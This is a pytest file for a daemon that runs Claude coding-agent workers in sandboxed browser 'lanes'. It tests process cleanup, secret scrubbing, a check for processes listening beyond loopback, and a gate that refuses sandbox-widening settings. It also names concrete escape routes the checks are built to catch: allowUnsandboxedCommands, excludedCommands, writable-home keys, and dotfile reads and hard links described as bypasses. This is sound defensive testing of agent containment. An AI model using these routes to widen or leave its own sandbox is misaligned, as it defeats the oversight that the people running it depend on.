def test_lane_pids_cant_say_when_ps_cant(env, tmp_root, monkeypatch, table, rc):
    """T7: without ps, teamd's own parents can't be spared, so the cleanup can't say what to end."""
    path = lane.ensure_lane("t1", "kaylee")

    def run(cmd, timeout=60):
        if cmd[0] == "/bin/ps":
            return Ran(rc, table)
        return Ran(0, "p111\nn%s/tmp/f\n" % path)
    monkeypatch.setattr(lane, "_run", run)
    monkeypatch.setattr(lane.shutil, "which", lambda name, path=None: "/usr/sbin/lsof")
    assert lane.lane_pids(path, None) is None


def test_the_next_check_is_counted_from_when_the_check_began(env, lanes, monkeypatch):
    """T8: the clock is read before listeners_ok, so a slow check never stretches the 60 s that follow it."""
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    real = lane.listeners_ok

    def slow_check():
        now[0] += 30
        return real()
    monkeypatch.setattr(lane, "listeners_ok", slow_check)
    team.spawn("check the login page", "claude", browser=True)
    assert team.lane_checked["kaylee"] == 1000.0
    now[0] = 1000.0 + lane.CHECK_EVERY_S
    team.monitor_once()
    assert lanes["calls"]["listeners"] == 2


def test_a_turn_that_started_and_then_failed_is_killed(env, lanes, monkeypatch):
    """T8 (the reviewer's probe): _launch_turn started claude, then failed; the started process is killed, never left
    running unwatched, and the lane is refused."""
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    started, real_launch = [], teamd.workers.launch

    def launch(*a, **kw):
        started.append(real_launch(*a, **kw))
        return started[-1]
    monkeypatch.setattr(teamd.workers, "launch", launch)
    real_log = team.log
    monkeypatch.setattr(team, "log", lambda msg: (_ for _ in ()).throw(OSError(28, "No space left on device"))
                        if "started pid" in msg else real_log(msg))
    team.spawn("check the login page", "claude", browser=True)
    try:
        assert started and started[0].wait(timeout=5) == -signal.SIGKILL
    finally:
        if started and started[0].poll() is None:
            os.killpg(started[0].pid, signal.SIGKILL)
    assert team.state["workers"]["kaylee"]["state"] == "failed" and "kaylee" not in team.procs
    assert any("couldn't start" in m for m in lead_messages(team, "LANE REFUSED"))


def test_slack_names_the_check_that_failed_without_reading_the_problems(env, lanes, monkeypatch):
    """T8: a listener whose name holds "settings" is the listener check's failure, never the settings check's."""
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    team.slack = FakeSlack()
    team.spawn("check the login page", "claude", browser=True)
    lanes["state"].update(ok=False, problems=["settings-sync (pid 9) listens on port 8000 (/opt/x/settings-sync)"])
    now[0] += 60
    team.monitor_once()
    stopped = [p for p in team.slack.posts if "lane turn stopped" in p]
    assert len(stopped) == 1 and "the listener check failed" in stopped[0], stopped


# ---------- Final fix wave: the smaller items ----------

def test_an_rpc_error_never_carries_the_lanes_secret(env, lanes):
    """Minor: teamd's answer to a request that raised is scrubbed like everything else it sends."""
    team, now = browser_team(env)
    team.lane_secrets.add(SECRET)

    def boom(req):
        raise RuntimeError("failed at ws://127.0.0.1:41031/" + SECRET)
    team.handle = boom
    resp = json.loads(team.respond(b'{"op": "status"}'))
    assert resp["ok"] is False and SECRET not in json.dumps(resp) and "[lane secret]" in resp["error"]
    assert SECRET not in (team.dir / "teamd.log").read_text()


def test_a_spawn_refused_for_an_unrecorded_manifest_logs_the_hash_for_andy(env, lanes, monkeypatch):
    """Minor: the lead hears that a person records the manifest; the hash itself goes to teamd.log."""
    team, now = browser_team(env)

    def refuse(repo, base, worktrees, verify=True):
        raise lane.LaneRefused("no manifest hash is recorded for chromium-headless-shell 1250 on darwin-arm64: a person "
                               "records the browser's manifest after `lane_acceptance.py --self-check-only` passes",
                               log="record " + "cd" * 32)
    monkeypatch.setattr(lane, "prepare_broker", refuse)
    with pytest.raises(lane.LaneRefused) as refused:
        team.spawn("check the login page", "claude", browser=True)
    assert "cd" * 32 not in str(refused.value) and "record " + "cd" * 32 in (team.dir / "teamd.log").read_text()


def test_a_waiting_worker_is_not_rehashed_every_retry(env, lanes):
    """Minor: before the listener check the install is only made sure of (verify=False: no manifest hashing); the hash
    runs once the check has passed, just before the broker starts."""
    team, now = browser_team(env)
    lanes["state"].update(ok=False, problems=["x (pid 1) listens on port 5000"])
    team.spawn("check the login page", "claude", browser=True)
    for _ in range(3):
        now[0] += teamd.LANE_RETRY_S
        team.monitor_once()
    assert lanes["calls"]["prepare"] == [True, False, False, False, False]        # spawn's own, then each retry
    lanes["state"].update(ok=True, problems=[])
    now[0] += teamd.LANE_RETRY_S
    team.monitor_once()
    assert lanes["calls"]["prepare"][-2:] == [False, True] and len(lanes["calls"]["started"]) == 1


def test_prepare_without_verify_hashes_nothing_already_installed(env, manifests, unpack, monkeypatch):
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    node = Path(os.path.realpath(NODE or sys.executable))
    monkeypatch.setattr(lane, "check_lane_node", lambda value, worktrees: node)
    monkeypatch.setattr(lane, "_run_env", lambda cmd, e, cwd, timeout=900: (
        fake_shell(lane.browsers_root() / "chromium_headless_shell-1243"), Ran(0, ""))[1])
    probe = env["tmp"] / "shellprobe"
    fake_shell(probe)
    record(manifests, "1243", lane.manifest_hash(probe))
    lane.prepare_broker(env["repo"], base, [], fetch=Registry(tarball))            # the first install, verified
    hashed, real = [], lane.manifest_hash
    monkeypatch.setattr(lane, "manifest_hash", lambda folder, ignore=(): (hashed.append(Path(folder).name),
                                                                          real(folder, ignore=ignore))[1])
    assert lane.prepare_broker(env["repo"], base, [], verify=False)[1] == lane.broker_root() / "playwright-core-1.55.0"
    assert hashed == []
    lane.prepare_broker(env["repo"], base, [])
    assert sorted(hashed) == ["chromium_headless_shell-1243", "playwright-core-1.55.0"]


def test_spawn_resolves_the_base_once_and_the_worktree_gets_that_commit(env, lanes, monkeypatch):
    """Minor: the commit the broker's Playwright was pinned from is the commit the worktree is made from, even if the
    branch the lead named moves in between."""
    team, now = browser_team(env)
    head = subprocess.run(["git", "-C", str(env["repo"]), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
    prepared, created, real_create = [], [], teamd.workers.create_worktree

    def prepare_broker(repo, base, worktrees, verify=True):
        prepared.append(base)
        (env["repo"] / "moved.txt").write_text("the branch moves on")          # main moves after the pin
        subprocess.run(["git", "-C", str(env["repo"]), "add", "."], check=True)
        subprocess.run(["git", "-C", str(env["repo"]), "commit", "-qm", "moved"], check=True)
        return "/opt/homebrew/bin/node", "/pw", "/shell"
    monkeypatch.setattr(lane, "prepare_broker", prepare_broker)
    monkeypatch.setattr(teamd.workers, "create_worktree", lambda root, team_id, wid, base=None: (
        created.append(base), real_create(root, team_id, wid, base))[1])
    branch = subprocess.run(["git", "-C", str(env["repo"]), "branch", "--show-current"], capture_output=True,
                            text=True).stdout.strip()
    team.spawn("check the login page", "claude", base=branch, browser=True)
    assert prepared[0] == head and created == [head] and team.state["workers"]["kaylee"]["base"] == head


# ---------- Final fix wave: T6, the dotfile probes ----------

def test_each_dotfile_probe_gets_its_own_variable(profile_paths, refusing, env):
    """T6: read_dotfile and link_dotfile used one PROBE_DOTFILE, so one probe could act on the other's file. A
    .zshrc linked to a file elsewhere in $HOME can be read (its real path), not hard-linked; .bashrc can be both."""
    home = env["home"]
    (home / "dotfiles").mkdir()
    (home / "dotfiles" / "zshrc").write_text("export X=1\n")
    (home / ".zshrc").unlink()
    (home / ".zshrc").symlink_to(home / "dotfiles" / "zshrc")
    (home / ".bashrc").write_text("export Y=1\n")
    seen = {}

    def sandbox(cmd, env=None, cwd=None, **kw):
        seen[cmd[-1]] = env
        return refusing(cmd, env=env, cwd=cwd)
    _self_check(profile_paths, sandbox)
    assert seen["read_dotfile"]["PROBE_DOTFILE"] == os.path.realpath(home / "dotfiles" / "zshrc")
    assert seen["link_dotfile"]["PROBE_LINK_DOTFILE"] == os.path.realpath(home / ".bashrc")


def test_a_dotfile_that_resolves_outside_home_is_no_target(probe_world, env):
    """T6: first() resolves each dotfile to its real path, which must lie under the real $HOME: a refused read of a file
    elsewhere says nothing about $HOME."""
    elsewhere = env["tmp"] / "etc-zshrc"
    elsewhere.write_text("system\n")
    (env["home"] / ".zshrc").unlink()
    (env["home"] / ".zshrc").symlink_to(elsewhere)
    targets = lane.probe_targets(None)
    assert targets["read_dotfile"] == ("PROBE_DOTFILE", None) and targets["open_rc_for_write"] == ("PROBE_RC", None)
    (env["home"] / ".bashrc").write_text("export Y=1\n")
    assert lane.probe_targets(None)["read_dotfile"] == ("PROBE_DOTFILE", Path(os.path.realpath(env["home"] / ".bashrc")))


def test_a_home_reached_through_a_symlink_gives_real_paths(probe_world, env, monkeypatch):
    linked = env["tmp"] / "home-link"
    linked.symlink_to(env["home"])
    monkeypatch.setenv("HOME", str(linked))
    assert lane.probe_targets(None)["read_dotfile"][1] == Path(os.path.realpath(env["home"] / ".zshrc"))


def test_the_link_probe_counts_the_link_even_when_removing_it_fails(tmp_path):
    """T6: making the link is the bypass; a cleanup that then throws must not turn it into a refusal."""
    node = shutil.which("node")
    if node is None:
        pytest.skip("node")
    rc = tmp_path / "rc"
    rc.write_text("x")
    prelude = "require('fs').rmSync = () => { throw Object.assign(new Error('no'), { code: 'EPERM' }); };\n"
    r = subprocess.run([node, "-e", prelude + PROBE_JS.read_text(), "link_dotfile"], capture_output=True, text=True,
                       timeout=60, env={"PATH": os.environ["PATH"], "HOME": str(tmp_path), "TMPDIR": str(tmp_path),
                                        "PROBE_LINK_DOTFILE": str(rc)})
    try:
        assert (r.returncode, r.stdout.strip()) == (0, "succeeded"), (r.stdout, r.stderr)
    finally:
        (tmp_path / "superyak-lane-probe-link").unlink(missing_ok=True)


def test_an_approved_apple_program_of_this_user_passes_on_a_link_local_address(listeners):
    """I3, with D11 (a deviation the report names): Apple's per-user agents (sharingd keeps AirDrop on awdl0) listen as
    this user on specific link-local addresses. An approved one passes there as it does on any port; it can't be a lane
    process that cleared its environment. An unapproved one of this user's still fails."""
    sharingd = "/usr/libexec/sharingd"
    listeners["exe"][640] = sharingd
    listeners["uids"][640] = os.getuid()
    listeners["sockets"].append(("tcp6", "fe80::1c2d:3eff:fe4f:5a6b%awdl0.8770", "LISTEN", 640, "sharingd"))
    ok, problems = lane.listeners_ok()
    assert not ok and problems == ["sharingd (pid 640) listens on fe80::1c2d:3eff:fe4f:5a6b%awdl0 port 8770, beyond "
                                   "loopback, as this user while a lane runs (/usr/libexec/sharingd)"]
    approve(APPROVED + [sharingd])
    assert lane.listeners_ok() == (True, [])



# ---------- Final fix wave, additions: the settings gate covers the whole sandbox block ----------

@pytest.mark.parametrize("name, sandbox, refused", [
    ("settings.json", {"filesystem": {"allowWrite": ["~"]}}, "adds sandbox.filesystem.allowWrite"),
    ("settings.local.json", {"excludedCommands": ["npm"]}, "adds sandbox.excludedCommands"),
    ("settings.json", {"allowUnsandboxedCommands": True}, "adds sandbox.allowUnsandboxedCommands"),
    ("managed", {"aFutureKey": {"deeper": {"still": 1}}}, "adds sandbox.aFutureKey.deeper.still"),
    ("settings.json", {"filesystem": {}}, "adds sandbox.filesystem"),
    ("settings.json", {"network": {"allowedDomains": None}}, "adds sandbox.network.allowedDomains"),
    ("settings.json", {"filesystem": {"deny Write\n": ["/"]}}, "adds a sandbox key this check doesn't know"),
    ("settings.json", {"network": {"allowedDomains": []}}, None),
])
def test_any_sandbox_key_but_an_empty_allowed_domains_refuses_a_lane(env, name, sandbox, refused):
    """Addition 1 (ruling): user and managed sandbox keys merge into the worker's sandbox, and excludedCommands run
    fully outside it, so for a lane any key at any depth refuses, except an empty network.allowedDomains. A key path
    is quoted back only when every part is a plain word."""
    path = lane.MANAGED_SETTINGS if name == "managed" else env["home"] / ".claude" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"sandbox": sandbox}))
    found = lane.settings_widenings()
    assert found == ([] if refused is None else ["%s %s" % (path, refused)])


def test_a_non_lane_workers_sandbox_is_still_what_it_was(env, monkeypatch):
    """Addition 1: the gate is a lane's only; a worker without a lane is spawned and set up as before."""
    (env["home"] / ".claude").mkdir()
    (env["home"] / ".claude" / "settings.json").write_text(json.dumps({"sandbox": {"excludedCommands": ["npm"]}}))
    monkeypatch.setattr(teamd.Team, "_fill_slots", lambda self: None)
    team = lane_team(env)
    assert team.spawn("write docs", "claude")["worker"] == "kaylee"
